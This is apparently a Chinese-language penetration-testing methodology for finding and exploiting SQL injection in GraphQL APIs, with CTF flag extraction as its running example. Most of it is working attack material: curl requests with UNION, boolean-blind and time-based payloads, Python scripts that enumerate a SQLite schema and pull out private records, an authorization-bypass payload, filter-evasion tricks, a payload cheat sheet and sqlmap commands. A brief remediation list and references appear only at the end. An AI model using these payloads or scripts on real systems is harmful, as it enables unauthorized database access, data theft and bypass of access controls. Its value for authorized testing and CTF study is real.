# GraphQL SQL 注入攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 GraphQL SQL 注入漏洞检测与利用流程，帮助发现和利用 GraphQL API 中的 SQL 注入漏洞，实现未授权数据访问和敏感信息提取。

## 1.2 适用范围

本文档适用于以下场景：
- 使用 GraphQL API 的 Web 应用
- GraphQL 解析器后端使用关系型数据库（MySQL、PostgreSQL、SQLite 等）
- GraphQL 参数直接拼接到 SQL 查询中
- CTF 挑战应用中的 GraphQL 注入场景

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

GraphQL SQL 注入是指攻击者通过 GraphQL 查询参数注入恶意 SQL 代码，从而操纵后端数据库查询。当 GraphQL 解析器将用户输入直接拼接到 SQL 查询中而未使用参数化查询时，就会发生此类漏洞。

**攻击链**：
```
GraphQL 查询参数 → 解析器处理 → SQL 查询拼接 → 数据库执行 → 数据泄露
```

**本质问题**：
- GraphQL 参数未进行输入验证
- 后端使用字符串拼接构造 SQL 查询
- 缺少参数化查询或预编译语句
- 无速率限制和输入过滤

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-89 | SQL 注入 |
| CWE-94 | 代码注入 |
| CWE-20 | 输入验证不当 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | GraphQL 查询示例 | 风险点描述 |
|---------|-----------------|-----------|
| 数据列表查询 | `jobs(jobType: "front-end")` | 参数直接拼接到 WHERE 子句 |
| 用户搜索 | `user(id: $userId)` | 用户 ID 参数注入 |
| 文章检索 | `posts(category: $cat)` | 分类参数注入 |
| 订单查询 | `order(orderId: $id)` | 订单 ID 参数注入 |
| 产品筛选 | `products(filter: $filter)` | 筛选条件注入 |

## 2.3 漏洞探测方法

### 2.3.1 GraphQL 端点识别

**步骤 1：常见 GraphQL 路径探测**

```bash
# 常见 GraphQL 端点路径
curl http://target.com/graphql
curl http://target.com/graphiql
curl http://target.com/api/graphql
curl http://target.com/api/v1/graphql

# 检查响应特征
# GraphQL 端点通常返回：
# - "Must provide query string"
# - GraphQL schema 信息
# - 400 Bad Request（需要 POST）
```

**步骤 2：GraphQL 内省查询**

```bash
# 执行内省查询获取 schema
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "__schema": {
      "queryType": {"name": "Query"},
      "types": {
        "kind": true,
        "name": true,
        "fields": {"name": true}
      }
    }
  }'

# 完整内省查询（获取完整 schema）
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @introspection_query.json
```

**步骤 3：确定查询参数**

```bash
# 查询特定字段的参数
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "__type": {"name": "Query"} {
      "fields": {
        "name": true,
        "args": {"name": true, "type": {"name": true}}
      }
    }
  }'
```

### 2.3.2 SQL 注入点识别

**步骤 1：基础探测 Payload**

```bash
# 测试单引号触发 SQL 错误
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs(jobType: \"'\''\") { id name } }"}'

# 如果返回 500 错误或 SQL 错误信息，可能存在注入

# 测试布尔条件
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs(jobType: \"'\'' OR '\''1'\''='\''1\") { id name } }"}'

# 对比正常响应和注入响应
# 如果返回更多数据，说明注入成功
```

**步骤 2：时间延迟探测（盲注）**

```bash
# SQLite 时间延迟
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs(jobType: \"'\'' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)\") { id name } }"}'

# MySQL 时间延迟
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs(jobType: \"'\'' AND SLEEP(5) --\") { id name } }"}'

# PostgreSQL 时间延迟
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs(jobType: \"'\'' AND (SELECT PG_SLEEP(5)) --\") { id name } }"}'
```

**步骤 3：自动化检测脚本**

```python
#!/usr/bin/env python3
"""
GraphQL SQL 注入检测脚本
"""

import requests
import json

GRAPHQL_URL = 'http://target.com/graphql'

def test_sqli():
    """测试 SQL 注入"""
    
    # Payload 库
    payloads = [
        # 基础探测
        {"name": "single_quote", "payload": "'", "expected": "error"},
        {"name": "or_true", "payload": "' OR '1'='1", "expected": "more_data"},
        {"name": "comment", "payload": "' --", "expected": "error_or_data"},
        
        # UNION 探测
        {"name": "union_null", "payload": "' UNION SELECT NULL--", "expected": "error_or_data"},
        {"name": "union_numbers", "payload": "' UNION SELECT 1,2,3,4--", "expected": "data"},
        
        # 数据库指纹
        {"name": "sqlite_version", "payload": "' UNION SELECT sqlite_version()--", "expected": "version"},
    ]
    
    for p in payloads:
        query = f'{{ jobs(jobType: "{p["payload"]}") {{ id name }} }}'
        
        response = requests.post(
            GRAPHQL_URL,
            json={'query': query},
            headers={'Content-Type': 'application/json'}
        )
        
        print(f"\n[*] Testing: {p['name']}")
        print(f"    Payload: {p['payload']}")
        print(f"    Status: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            if 'errors' in data:
                print(f"    Errors: {data['errors']}")
            if 'data' in data:
                print(f"    Data: {json.dumps(data['data'], indent=2)[:200]}")

if __name__ == '__main__':
    test_sqli()
```

## 2.4 漏洞利用方法

### 2.4.1 联合查询注入（UNION-based）

**场景**：GraphQL 查询结果直接返回给用户

**利用步骤**：

```bash
# 步骤 1：确定列数
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs(jobType: \"'\'' UNION SELECT NULL--\") { id } }"}'

curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs(jobType: \"'\'' UNION SELECT NULL,NULL--\") { id } }"}'

curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs(jobType: \"'\'' UNION SELECT NULL,NULL,NULL,NULL--\") { id } }"}'
# 当不再报错时，说明列数匹配

# 步骤 2：确定显示字段
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs(jobType: \"'\'' UNION SELECT 1,2,3,4--\") { id name type description } }"}'
# 观察哪个字段显示注入的值

# 步骤 3：提取数据库信息（SQLite）
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs(jobType: \"'\'' UNION SELECT 1,sqlite_version(),'\''info'\'','\''info'\''--\") { id name type description } }"}'

# 步骤 4：提取表名
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs(jobType: \"'\'' UNION SELECT 1,name,type,sql FROM sqlite_master WHERE type='\''table'\''--\") { id name type description } }"}'

# 步骤 5：提取敏感数据
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs(jobType: \"'\'' UNION SELECT id,name,type,description FROM jobs--\") { id name type description } }"}'
```

### 2.4.2 布尔盲注（Boolean-based Blind）

**场景**：页面无错误信息，但可根据返回数据量判断

**利用步骤**：

```bash
# 步骤 1：确认注入点
# 正常查询返回 3 条记录
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs { id name } }"}'

# 注入真条件，应返回更多记录
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs(jobType: \"'\'' OR '\''1'\''='\''1\") { id name } }"}'

# 注入假条件，应返回相同或更少记录
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs(jobType: \"'\'' AND '\''1'\''='\''2\") { id name } }"}'

# 步骤 2：逐字符提取数据
# 判断表名第一个字符
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs(jobType: \"'\'' OR (SELECT substr(name,1,1) FROM sqlite_master WHERE type='\''table'\'' LIMIT 1)='\''j'\''--\") { id name } }"}'

# 如果返回数据，说明第一个字符是'j'
# 继续提取完整表名
```

### 2.4.3 授权绕过利用

**场景**：应用有弱授权检查但可被 SQL 注入绕过

**利用步骤**：

```bash
# 场景：应用检查 jobType == "private" 来阻止访问
# 但 SQL 注入可以绕过这个检查

# 步骤 1：确认授权检查
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs(jobType: \"private\") { id name } }"}'
# 返回："Only admins can see private jobs"

# 步骤 2：SQL 注入绕过授权
# Payload 不等于 "private" 字符串，但 SQL 逻辑可以访问 private 数据
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs(jobType: \"'\'' OR type='\''private'\'' --\") { id name type description } }"}'

# 步骤 3：提取私有数据
# 返回包含 private 类型的记录，包括 Flag
```

### 2.4.4 完整利用脚本

```python
#!/usr/bin/env python3
"""
GraphQL SQL 注入完整利用脚本
针对 SQLite 数据库
"""

import requests
import json
import re

GRAPHQL_URL = 'http://target.com/graphql'

def execute_query(payload):
    """执行 GraphQL 查询"""
    query = f'{{ jobs(jobType: "{payload}") {{ id name type description }} }}'
    
    response = requests.post(
        GRAPHQL_URL,
        json={'query': query},
        headers={'Content-Type': 'application/json'}
    )
    
    if response.status_code == 200:
        return response.json()
    return None

def extract_flag():
    """提取 Flag"""
    
    # 方法 1：直接 UNION 注入
    payload = "' OR type='private' --"
    result = execute_query(payload)
    
    if result and 'data' in result:
        for job in result['data'].get('jobs', []):
            if 'FLAG' in job.get('description', ''):
                print(f"[SUCCESS] Flag found: {job['description']}")
                return job['description']
    
    # 方法 2：获取所有数据
    payload = "' OR '1'='1"
    result = execute_query(payload)
    
    if result and 'data' in result:
        for job in result['data'].get('jobs', []):
            desc = job.get('description', '')
            if 'FLAG' in desc or 'flag' in desc:
                print(f"[SUCCESS] Flag found: {desc}")
                return desc
    
    return None

def enumerate_database():
    """枚举数据库结构"""
    
    print("\n[*] Enumerating database...")
    
    # 获取 SQLite 版本
    payload = "' UNION SELECT 1,sqlite_version(),'info','info'--"
    result = execute_query(payload)
    if result and 'data' in result:
        for job in result['data'].get('jobs', []):
            if job.get('type') == 'info':
                print(f"[+] SQLite Version: {job['name']}")
    
    # 获取表名
    payload = "' UNION SELECT 1,name,type,sql FROM sqlite_master WHERE type='table'--"
    result = execute_query(payload)
    if result and 'data' in result:
        print("[+] Tables:")
        for job in result['data'].get('jobs', []):
            if job.get('type') == 'table':
                print(f"    - {job['name']}: {job.get('description', '')[:100]}")
    
    # 获取所有数据
    payload = "' OR '1'='1"
    result = execute_query(payload)
    if result and 'data' in result:
        print(f"\n[+] Total records: {len(result['data'].get('jobs', []))}")

def main():
    print("[*] Starting GraphQL SQL injection attack...\n")
    
    # 步骤 1：枚举数据库
    enumerate_database()
    
    # 步骤 2：提取 Flag
    print("\n[*] Extracting flag...")
    flag = extract_flag()
    
    if flag:
        print(f"\n[SUCCESS] Flag: {flag}")
    else:
        print("\n[FAILED] Could not extract flag")

if __name__ == '__main__':
    main()
```

## 2.5 漏洞利用绕过方法

### 2.5.1 授权检查绕过

**场景**：应用在 SQL 执行前有字符串检查

```bash
# 问题：应用检查 job_type == "private"
# 解决：使用不等于 "private" 的 payload

# ❌ 被阻止
jobType = "private"

# ✅ 绕过：SQL 注入 payload 不等于 "private"
jobType = "' OR type='private' --"
jobType = "' UNION SELECT * FROM jobs WHERE type='private'--"
jobType = "' OR '1'='1"
```

### 2.5.2 输入过滤绕过

**场景**：应用过滤特定 SQL 关键词

```bash
# 绕过 UNION 过滤
# 使用双写绕过
UNION → UNUNIONION
SELECT → SELSELECTECT

# 绕过空格过滤
# 使用注释代替空格
UNION/**/SELECT
UNION/*comment*/SELECT

# 绕过引号过滤
# 使用十六进制编码
'private' → 0x70726976617465
```

### 2.5.3 错误隐藏绕过

**场景**：应用不返回 SQL 错误信息

```bash
# 使用盲注技术
# 布尔盲注：根据返回数据量判断
curl -X POST http://target.com/graphql \
  -d '{"query": "{ jobs(jobType: \"'\'' OR (SELECT count(*) FROM jobs)>3--\") { id } }"}'

# 时间盲注：根据响应时间判断
curl -X POST http://target.com/graphql \
  -d '{"query": "{ jobs(jobType: \"'\'' AND (SELECT CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END)--\") { id } }"}'
```

### 2.5.4 GraphQL 特定绕过

**场景**：GraphQL 层有输入验证

```bash
# 绕过 GraphQL 类型检查
# 使用变量注入
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query($type: String!) { jobs(jobType: $type) { id } }",
    "variables": {"type": "' OR '1'='1"}
  }'

# 绕过查询深度限制
# 使用扁平查询
{
  jobs(jobType: "' OR '1'='1") {
    id
    name
    type
    description
  }
}
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| Payload 类型 | Payload 示例 | 适用场景 |
|------------|------------|---------|
| 基础探测 | `'` | 测试单引号错误 |
| 布尔注入 | `' OR '1'='1` | 返回所有记录 |
| 授权绕过 | `' OR type='private' --` | 绕过参数检查 |
| UNION 注入 | `' UNION SELECT 1,2,3,4--` | 联合查询 |
| 数据库指纹 | `' UNION SELECT sqlite_version()--` | SQLite 识别 |
| 表名枚举 | `' UNION SELECT name FROM sqlite_master WHERE type='table'--` | 表名提取 |
| 时间盲注 | `' AND SLEEP(5)--` | 盲注测试 |

## 3.2 GraphQL 内省查询模板

```json
{
  "__schema": {
    "queryType": {"name": "Query"},
    "types": [
      {
        "kind": true,
        "name": true,
        "description": true,
        "fields": {
          "name": true,
          "args": {
            "name": true,
            "type": {"name": true, "kind": true}
          },
          "type": {"name": true}
        }
      }
    ]
  }
}
```

## 3.3 自动化利用工具

```bash
# 使用 SQLMap 进行 GraphQL 注入测试
sqlmap -u "http://target.com/graphql" \
  --data '{"query": "{ jobs(jobType: \"*\") { id } }"}' \
  --headers "Content-Type: application/json" \
  --prefix="\"" --suffix="--" \
  --tamper=space2comment

# 使用 InQL 进行 GraphQL 扫描
inql scan http://target.com/graphql

# 使用 Graphw00f 进行 GraphQL 指纹识别
graphw00f -t http://target.com/graphql
```

## 3.4 修复建议

1. **使用参数化查询** - 始终使用预编译语句，避免字符串拼接
2. **输入验证** - 对 GraphQL 参数进行严格的白名单验证
3. **最小权限原则** - 数据库账户使用最小必要权限
4. **速率限制** - 对 GraphQL 查询实施速率限制
5. **查询复杂度限制** - 限制查询深度和复杂度
6. **错误处理** - 不向客户端返回详细错误信息

---

**参考资源**：
- [OWASP GraphQL Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [PortSwigger - SQL Injection](https://portswigger.net/web-security/sql-injection)
- [GraphQL Injection Guide - Doyensec](https://blog.doyensec.com/graphql-introspection.html)
